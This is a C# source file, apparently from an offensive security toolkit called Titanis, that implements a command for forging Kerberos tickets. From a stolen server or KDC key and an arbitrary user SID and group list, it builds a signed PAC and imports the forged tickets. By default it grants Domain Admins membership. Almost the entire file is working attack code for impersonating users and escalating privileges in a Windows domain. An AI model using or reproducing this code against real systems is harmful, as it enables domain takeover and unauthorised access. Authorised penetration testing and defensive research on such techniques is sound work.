using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Titanis.PduStruct;
using Titanis.Security;
using Titanis.Security.Kerberos;
using Titanis.Winterop.Security;

namespace Titanis.Cli.Kerb;

[Command]
[Description("Forges a ticket")]
[DetailedHelpText(@"The forged ticket includes a PAC signed with ")]
public class ForgeCommand : TicketRequestCommand
{
	private SecurityIdentifier domainSid;

	[Parameter]
	[Mandatory]
	[Description("Ticket encryption type")]
	public EType TicketEType { get; set; }

	[Parameter]
	[Mandatory]
	[Description("Key of server to receive the ticket")]
	public HexString ServerKey { get; set; }

	[Parameter]
	[Description("KDC key type")]
	public EType KdcEType { get; set; }

	[Parameter]
	[Description("Key to sign the ticket and PAC with")]
	public HexString KdcKey { get; set; }

	[Parameter(0)]
	[Mandatory]
	[Description("Target SPN")]
	public SecurityPrincipalName[] Target { get; set; }

	[Parameter]
	[Mandatory]
	[Description("User SID")]
	public SecurityIdentifier UserSid { get; set; }

	[Parameter]
	[Mandatory]
	[Description("User name")]
	public UserPrincipalName UserName { get; set; }

	[Parameter]
	[Description("Logon domain (FQDN) of the user")]
	public string UserRealm { get; set; }

	[Parameter]
	[Description("Ticket realm")]
	public string? Realm { get; set; }

	[Parameter]
	[Description("Service realm")]
	public string? ServiceRealm { get; set; }

	[Parameter]
	[Description("Name of logon server")]
	public string? LogonServer { get; set; }

	[Parameter]
	[Description("Logon domain (NetBIOS) of the user")]
	public string? UserDomain { get; set; }

	[Parameter]
	[Description("Group RIDs, relative to the user domain")]
	public uint[]? DomainRids { get; set; }

	[Parameter]
	[Description("Extra group SIDs")]
	public SecurityIdentifier[]? ExtraSids { get; set; }

	[Parameter]
	[Description("Domain of SID containing resource")]
	public SecurityIdentifier? ResourceDomainSid { get; set; }

	[Parameter]
	[Description("Group RIDs, relative to the resource domain")]
	public uint[]? ResourceGroupRids { get; set; }

	[Parameter]
	[Description("User's full name")]
	public string? FullName { get; set; }

	[Parameter]
	[Description("Primary group ID")]
	[DefaultPort(0x0201)]
	public uint PrimaryGroupId { get; set; }

	[Parameter]
	[Description("UNC path of logon script")]
	public string? LogonScript { get; set; }

	[Parameter]
	[Description("UNC path of user profile")]
	public string? ProfilePath { get; set; }

	[Parameter]
	[Description("UNC path of home directory")]
	public string? HomeDirectory { get; set; }

	[Parameter]
	[Description("Home Drive (e.g. H:)")]
	public string? HomeDrive { get; set; }

	protected override void ValidateParameters(ParameterValidationContext context)
	{
		base.ValidateParameters(context);

		var userSid = this.UserSid;
		//if (UserSid.SubauthorityCount <= 1)
		//	context.LogError(nameof(this.UserSid), $"The user SID does not contain enough subauthorities.");

		if (this.DomainRids is null)
		{
			this.Log.WriteVerbose("No domain RIDs specified; adding DomainAdmins (512) and DomainUsers (513)");
			this.DomainRids = [0x200, 0x201];
		}
		if (this.ExtraSids is null)
		{
			this.Log.WriteVerbose($"No extra SIDs specified; adding default sid S-1-18-1");
			this.ExtraSids = [SecurityIdentifier.Parse("S-1-18-1")];
		}

		this.domainSid = new SecurityIdentifier(this.UserSid.IdentifierAuthority, this.UserSid.GetSubauthorities()[..^1]);
		if (this.ResourceDomainSid == null)
		{
			this.ResourceDomainSid = domainSid;
		}

		// User realm
		if (string.IsNullOrEmpty(this.UserRealm))
		{
			var userRealm = this.UserName?.Realm ?? this.UserDomain;
			if (userRealm != null)
			{
				this.WriteVerbose($"User realm inferred from other parameters: {userRealm}");
				this.UserRealm = userRealm;
			}

			if (string.IsNullOrEmpty(this.UserRealm))
			{
				context.LogError(nameof(UserRealm), $"User realm must be specifiede, either with the user name or with -UserRealm, -UserDomain");
			}
		}
		if (!(this.UserRealm?.Contains('.') ?? true))
			this.WriteWarning($"-{nameof(UserRealm)} should specify the FQDN, but it appears to be a NetBIOS name: {this.UserRealm}");

		// UserDomain
		if (string.IsNullOrEmpty(this.UserDomain))
		{
			var userDomain = this.UserName?.Realm ?? this.UserRealm;
			if (userDomain != null)
			{
				this.WriteVerbose($"User domain inferred from other parameters: {userDomain}");
				this.UserDomain = userDomain;
			}

			if (string.IsNullOrEmpty(this.UserDomain))
			{
				context.LogError(nameof(UserDomain), $"User domain must be specifiede, either with the user name or with -UserRealm, -UserDomain");
			}
		}
		if (this.UserDomain?.Contains('.') ?? false)
			this.WriteWarning($"-{nameof(UserDomain)} should specify the NetBIOS name, but it appears to be a FQDN: {this.UserRealm}");
	}

	protected override Task<IList<TicketInfo>?> RequestTickets(KerberosClient krb, CancellationToken cancellationToken)
	{
		string clientRealm = this.UserRealm ?? string.Empty;
		string clientDomain = this.UserDomain ?? string.Empty;    // Simple, not FQDN

		string ticketRealm = this.Realm ?? clientRealm;
		string serviceRealm = this.ServiceRealm ?? clientRealm;
		string logonServer = this.LogonServer ?? string.Empty;

		const KdcOptions options = KdcOptions.Canonicalize | KdcOptions.Preauthenticated | KdcOptions.Initial | KdcOptions.Renewable | KdcOptions.Forwardable;

		SessionKey serverKey = krb.GetEncProfile(this.TicketEType).CreateSessionKey(this.ServerKey.Bytes);
		SessionKey? kdcKey = (this.KdcKey != null) ? krb.GetEncProfile(this.KdcEType).CreateSessionKey(this.KdcKey.Bytes) : null;

		DateTime authTime = (DateTime.UtcNow - TimeSpan.FromSeconds(89)).RoundSeconds();
		DateTime startTime = authTime;
		DateTime renewTill = authTime + TimeSpan.FromSeconds(24 * 60 * 60);
		DateTime passwordSetTime = authTime;
		DateTime passwordCanChange = passwordSetTime;
		string fullName = this.FullName ?? this.UserName.WireName;
		int logonCount = 0xA5;
		uint userRid = this.UserSid.Rid;
		SecurityIdentifier userSid = this.UserSid;
		DateTime endTime = authTime + TimeSpan.FromHours(10);
		UserPrincipalName upn = this.UserName;
		string accountName = upn.GetNamePart(0);


		LogonInfo logonInfo = new LogonInfo
		{
			LogonTime = authTime,
			LogoffTime = null,
			KickOffTime = null,
			LastSuccessfulLogon = null,
			LastFailedLogon = null,
			PasswordLastSet = passwordSetTime,
			PasswordCanChange = passwordCanChange,
			PasswordMustChange = null,
			EffectiveName = accountName,
			FullName = fullName,
			//LogonScript = string.Empty,
			//ProfilePath = string.Empty,
			//HomeDirectory = string.Empty,
			//HomeDirectoryDrive = string.Empty,
			LogonScript = this.LogonScript ?? string.Empty,
			ProfilePath = this.ProfilePath ?? string.Empty,
			HomeDirectory = this.HomeDirectory ?? string.Empty,
			HomeDirectoryDrive = this.HomeDrive ?? string.Empty,
			LogonCount = logonCount,
			BadPasswordCount = 0,
			UserId = userRid,
			PrimaryGroupId = this.PrimaryGroupId,
			UserFlags = 0,
			UserSessionKey = null,
			LogonServer = logonServer,
			LogonDomainName = clientDomain,
			LogonDomainSid = domainSid,
			UserAccountControl = SamUserAccountFlags.NormalAccount | SamUserAccountFlags.DontExpirePassword,
			ResourceGroupDomainSid = domainSid,
		};

		// Default to AuthenticationAuthorityAssertedIdentity
		var extraSids = this.ExtraSids;
		if (!extraSids.IsNullOrEmpty())
		{
			logonInfo.SetExtraSids(Array.ConvertAll(extraSids, r =>
				new SidWithAttributes(r, SidAttributes.Mandatory | SidAttributes.EnabledByDefault | SidAttributes.Enabled))
				);
		}
		if (!this.ResourceGroupRids.IsNullOrEmpty())
		{
			logonInfo.SetResourceGroupIds(Array.ConvertAll(this.ResourceGroupRids, r => new RidWithAttributes(r, SidAttributes.Mandatory | SidAttributes.Enabled | SidAttributes.EnabledByDefault | SidAttributes.Resource)));
			//// DeniedRodcPasswordReplicationGroup
			//new RidWithAttributes(572, SidAttributes.Mandatory | SidAttributes.Enabled | SidAttributes.EnabledByDefault | SidAttributes.Resource),
		}

		// Default to domain admins and domain users
		var domainRids = this.DomainRids;
		if (!DomainRids.IsNullOrEmpty())
		{
			logonInfo.SetGroupIds(Array.ConvertAll(domainRids, r =>
				new RidWithAttributes(r, SidAttributes.Mandatory | SidAttributes.Enabled | SidAttributes.EnabledByDefault)));
		}

		UpnDnsInfo upnDnsInfo = new UpnDnsInfo
		{
		};

		SessionKey sessionKey = new(krb.GetEncProfile(EType.Aes128CtsHmacSha1_96), new byte[128 / 8]);

		List<TicketInfo> tickets = new List<TicketInfo>();
		foreach (var target in this.Target)
		{
			var forged = krb.ForgeTicket(
				options,
				upn,
				clientRealm,
				ticketRealm,
				target,
				serviceRealm,
				sessionKey,
				serverKey,
				authTime,
				endTime,
				startTime,
				renewTill,
				logonInfo,
				upnDnsInfo,
				kdcKey
				);
			tickets.Add(forged);
		}
		krb.ImportTickets(tickets);

		return Task.FromResult<IList<TicketInfo>?>(tickets);
	}
}
